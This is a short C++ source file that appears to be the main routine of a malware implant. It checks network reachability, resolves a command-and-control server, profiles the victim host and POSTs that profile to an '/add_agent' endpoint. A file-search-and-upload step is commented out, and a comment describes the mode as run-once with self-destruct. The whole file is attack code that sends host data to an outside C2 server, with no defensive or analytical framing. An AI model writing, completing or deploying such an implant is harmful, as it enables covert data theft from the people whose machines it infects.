#include "Core/upload.hpp"
#include "Core/profiler.hpp"
#include "Communication/google_resolve.hpp"
#include "Communication/c2_resolve.hpp"
#include "Core/helpers.hpp"
#include "Core/file_search.hpp"



int main() {

    // Mode 1: run once and then > cleanup > self destruct
    if (ONETIMERUN) {  
        bool ReachIntranet = googleConn(); 
        if (ReachIntranet) { 
            std::wstring C2 = C2Conn(URLS); 
            if (!C2.empty()) {
                // Path to /add_agent
                std::wstring PC2 = C2 + STAGE1PATH;
                nlohmann::json JsonProfile = Profiler(); 
                std::string response = SendData(L"POST", PC2, L"", JsonProfile, L"");
                auto jsonResp = nlohmann::json::parse(response);
                if (jsonResp.contains("message") && jsonResp["message"] == "created") {
                    std::cout << "Running file search" << std::endl;
                    //ProcessFilesAndUpload(C2);
                }
                
            }
            
        }
        
    }
    

    return 0;
}

